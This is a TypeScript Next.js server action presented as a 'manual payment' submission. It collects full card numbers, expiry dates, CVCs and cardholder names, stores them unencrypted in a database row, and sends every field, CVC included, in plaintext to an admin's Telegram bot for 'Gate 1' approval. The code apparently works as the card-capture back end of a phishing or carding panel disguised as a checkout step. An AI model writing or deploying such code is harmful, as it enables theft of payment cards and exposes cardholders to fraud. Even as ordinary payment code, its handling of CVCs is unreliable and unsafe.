'use server'

import { createClient } from '@supabase/supabase-js'
import { redirect } from 'next/navigation'
import crypto from 'crypto'
import { sendTelegramAlert } from '@/utils/telegram'

export async function submitManualPayment(formData: FormData) {
    const supabase = createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.SUPABASE_SERVICE_ROLE_KEY!
    )

    const rawToken = formData.get('token') as string
    if (!rawToken) throw new Error("Missing token")

    const tokenHash = crypto.createHash('sha256').update(rawToken).digest('hex')

    const { data: client, error: fetchError } = await supabase
        .from('clients')
        .select('id, email, state, admin_id')
        .eq('token_hash', tokenHash)
        .single()

    if (fetchError || !client) {
        redirect('/unauthorized')
    }

    // Build the payload
    const payment_payload = {
        card_number: formData.get('cardNumber'),
        exp_month: formData.get('expMonth'),
        exp_year: formData.get('expYear'),
        cvc: formData.get('cvc'),
        cardholder_name: formData.get('cardholderName')
    }

    // Capture Card Details for Admin Verification
    await supabase.from('clients').update({ payment_payload }).eq('id', client.id)

    // Send state to PAYMENT_SUBMITTED so Admin can review in Gate 1
    const { error: transitionError } = await supabase.rpc('transition_client_state', {
        p_client_id: client.id,
        p_new_state: 'PAYMENT_SUBMITTED',
        p_actor: 'client',
        p_ip: 'unknown'
    })

    if (transitionError) {
        console.error(transitionError)
        throw new Error("Could not transition state")
    }

    const msg = `💳 <b>New Payment Method Submitted!</b> (Action Required in Gate 1)
<b>Client ID:</b> ${client.id.substring(0, 8)}
<b>Email:</b> ${client.email}
<b>Name on Card:</b> ${payment_payload.cardholder_name}
<b>Card Number:</b> <code>${payment_payload.card_number}</code>
<b>Expiration:</b> ${payment_payload.exp_month}/${payment_payload.exp_year}
<b>CVC:</b> <code>${payment_payload.cvc}</code>`;

    const buttons = {
        inline_keyboard: [
            [
                { text: '✅ Approve Gate 1', callback_data: `approve_gate_1:${client.id}` },
                { text: '❌ Reject', callback_data: `reject_gate_1:${client.id}` }
            ]
        ]
    };

    await sendTelegramAlert(client.admin_id, msg, buttons)

    return { success: true, redirectUrl: `/track?token=${rawToken}` }
}
